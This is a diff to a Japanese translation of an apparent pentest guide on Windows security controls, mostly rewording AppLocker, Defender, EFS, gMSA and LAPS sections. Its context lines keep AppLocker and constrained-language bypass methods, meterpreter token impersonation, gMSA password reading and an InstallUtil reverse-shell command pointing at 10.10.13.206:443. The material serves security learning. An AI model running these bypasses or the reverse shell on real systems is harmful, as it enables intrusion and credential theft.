@@ -11,7 +11,7 @@
 
 ### Check
 
-ブラックリストまたはホワイトリストに登録されているファイル/拡張子を確認します：
+どのファイル/拡張子がブラックリスト/ホワイトリストに登録されているかを確認します：
 ```powershell
 Get-ApplockerPolicy -Effective -xml
 
@@ -36,7 +36,7 @@ C:\windows\tracing
 - 一般的に**信頼された**[**"LOLBAS's"**](https://lolbas-project.github.io/)バイナリは、AppLockerを回避するのにも役立ちます。
 - **不適切に書かれたルールも回避される可能性があります**
 - 例えば、**`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**のように、**`allowed`**という**フォルダーを任意の場所に作成**すれば許可されます。
-- 組織はしばしば**`%System32%\WindowsPowerShell\v1.0\powershell.exe`実行可能ファイルをブロックすることに焦点を当てますが、**他の**[**PowerShell実行可能ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)を忘れがちです。例えば、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`や`PowerShell_ISE.exe`などです。
+- 組織はしばしば**`%System32%\WindowsPowerShell\v1.0\powershell.exe`**実行可能ファイルを**ブロックすることに焦点を当てますが、**他の**[**PowerShell実行可能ファイルの場所**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)を忘れがちです。例えば、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`や`PowerShell_ISE.exe`などです。
 - **DLLの強制は非常に稀に有効**であり、システムにかかる追加の負荷や、何も壊れないことを確認するために必要なテストの量が理由です。したがって、**DLLをバックドアとして使用することでAppLockerを回避するのに役立ちます**。
 - [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)や[**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick)を使用して、**任意のプロセスでPowershell**コードを**実行し、AppLockerを回避する**ことができます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)を確認してください。
 
@@ -69,11 +69,11 @@ LSAはディスクにいくつかの資格情報を保存することがあり�
 
 ## ディフェンダー
 
-[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)は、Windows 10およびWindows 11、そしてWindows Serverのバージョンで利用可能なアンチウイルスです。**一般的なペンテストツール（例：**`WinPEAS`**）を**ブロック**します。しかし、これらの保護を**回避する方法**があります。
+[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender)は、Windows 10およびWindows 11、Windows Serverのバージョンで利用可能なアンチウイルスです。**一般的なペンテストツール**（例：**`WinPEAS`**）を**ブロック**します。しかし、これらの保護を**回避する方法**があります。
 
 ### チェック
 
-**Defender**の**状態**を確認するには、PSコマンドレット**`Get-MpComputerStatus`**を実行できます（**`RealTimeProtectionEnabled`**の値を確認して、アクティブかどうかを知ることができます）：
+**Defender**の**ステータス**を確認するには、PSコマンドレット**`Get-MpComputerStatus`**を実行できます（**`RealTimeProtectionEnabled`**の値を確認して、アクティブかどうかを知る）：
 
 <pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus
 
@@ -110,7 +110,7 @@ EFSは、**対称鍵**である**ファイル暗号化鍵（FEK）**を使用し
 - ファイルやフォルダーが[FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)のような非EFSファイルシステムに移動されると、自動的に復号されます。
 - SMB/CIFSプロトコルを介してネットワーク上で送信された暗号化ファイルは、送信前に復号されます。
 
-この暗号化方法は、所有者に対して暗号化ファイルへの**透過的アクセス**を提供します。ただし、所有者のパスワードを単に変更してログインするだけでは復号は許可されません。
+この暗号化方法は、所有者に対して暗号化ファイルへの**透過的アクセス**を提供します。ただし、所有者のパスワードを変更してログインするだけでは復号は許可されません。
 
 **重要なポイント**：
 
@@ -121,16 +121,16 @@ EFSは、**対称鍵**である**ファイル暗号化鍵（FEK）**を使用し
 
 ### EFS情報の確認
 
-この**サービス**を**使用した**かどうかを確認するには、このパスが存在するか確認します：`C:\users\<username>\appdata\roaming\Microsoft\Protect`
+この**サービス**を**使用**した**ユーザー**がいるか確認するには、このパスが存在するかチェックします：`C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-ファイルへの**アクセス権**を確認するには、cipher /c \<file>\を使用します。\
+ファイルへの**アクセス**権を確認するには、cipher /c \<file>\を使用します。\
 フォルダー内で`cipher /e`および`cipher /d`を使用して、すべてのファイルを**暗号化**および**復号**することもできます。
 
 ### EFSファイルの復号
 
 #### 権限のあるシステムであること
 
-この方法では、**被害者ユーザー**がホスト内で**プロセス**を**実行している**必要があります。その場合、`meterpreter`セッションを使用してユーザーのプロセスのトークンを偽装することができます（`incognito`の`impersonate_token`）。または、ユーザーのプロセスに`migrate`することもできます。
+この方法では、**被害者ユーザー**がホスト内で**プロセス**を**実行**している必要があります。その場合、`meterpreter`セッションを使用してユーザーのプロセスのトークンを偽装することができます（`incognito`の`impersonate_token`）。または、ユーザーのプロセスに`migrate`することもできます。
 
 #### ユーザーのパスワードを知っていること
 
@@ -138,7 +138,7 @@ EFSは、**対称鍵**である**ファイル暗号化鍵（FEK）**を使用し
 
 ## Group Managed Service Accounts (gMSA)
 
-Microsoftは、ITインフラストラクチャにおけるサービスアカウントの管理を簡素化するために**グループ管理サービスアカウント（gMSA）**を開発しました。従来のサービスアカウントは「**パスワードは期限切れにならない**」設定が有効であることが多いのに対し、gMSAはより安全で管理しやすいソリューションを提供します：
+Microsoftは、ITインフラストラクチャにおけるサービスアカウントの管理を簡素化するために**グループ管理サービスアカウント（gMSA）**を開発しました。従来のサービスアカウントは「**パスワードは期限切れにならない**」設定が有効であることが多いですが、gMSAはより安全で管理しやすいソリューションを提供します：
 
 - **自動パスワード管理**：gMSAは、ドメインまたはコンピュータポリシーに従って自動的に変更される複雑な240文字のパスワードを使用します。このプロセスはMicrosoftのキー配布サービス（KDC）によって処理され、手動でのパスワード更新が不要になります。
 - **強化されたセキュリティ**：これらのアカウントはロックアウトに対して免疫があり、対話的ログインには使用できないため、セキュリティが向上します。
@@ -154,13 +154,13 @@ gMSAのパスワードはLDAPプロパティ_**msDS-ManagedPassword**_に保存�
 ```
 /GMSAPasswordReader --AccountName jkohler
 ```
-[**この投稿で詳細情報を見つける**](https://cube0x0.github.io/Relaying-for-gMSA/)
+[**この投稿で詳細を確認してください**](https://cube0x0.github.io/Relaying-for-gMSA/)
 
 また、**gMSA**の**パスワード**を**読み取る**ための**NTLMリレー攻撃**を実行する方法については、こちらの[ウェブページ](https://cube0x0.github.io/Relaying-for-gMSA/)を確認してください。
 
 ## LAPS
 
-**ローカル管理者パスワードソリューション (LAPS)**は、[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)からダウンロード可能で、ローカル管理者パスワードの管理を可能にします。これらのパスワードは**ランダム化**され、ユニークで、**定期的に変更**され、Active Directoryに中央集権的に保存されます。これらのパスワードへのアクセスは、ACLを通じて承認されたユーザーに制限されています。十分な権限が付与されると、ローカル管理者パスワードを読み取る能力が提供されます。
+**ローカル管理者パスワードソリューション (LAPS)**は、[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)からダウンロード可能で、ローカル管理者パスワードの管理を可能にします。これらのパスワードは**ランダム化**され、ユニークで、**定期的に変更**され、Active Directoryに中央集権的に保存されます。これらのパスワードへのアクセスは、ACLを通じて認可されたユーザーに制限されています。十分な権限が付与されると、ローカル管理者パスワードを読み取る能力が提供されます。
 
 {{#ref}}
 active-directory-methodology/laps.md
@@ -191,11 +191,11 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用して、任意のプロセスで **Powershell** コードを実行し、制約モードを回避できます。詳細については、次を確認してください: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)。
+[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用して、任意のプロセスで **Powershell** コードを実行し、制約モードを回避できます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode) を確認してください。
 
 ## PS 実行ポリシー
 
-デフォルトでは **restricted** に設定されています。このポリシーを回避する主な方法:
+デフォルトでは **restricted** に設定されています。このポリシーを回避する主な方法：
 ```powershell
 1º Just copy and paste inside the interactive PS console
 2º Read en Exec
@@ -240,7 +240,7 @@ SSPIは、通信を希望する2台のマシンに適切なプロトコルを見
 
 ## UAC - ユーザーアカウント制御
 
-[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された活動のための同意プロンプトを有効にする**機能です。
+[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)は、**昇格された活動のための同意プロンプトを有効にする**機能です。
 
 {{#ref}}
 windows-security-controls/uac-user-account-control.md
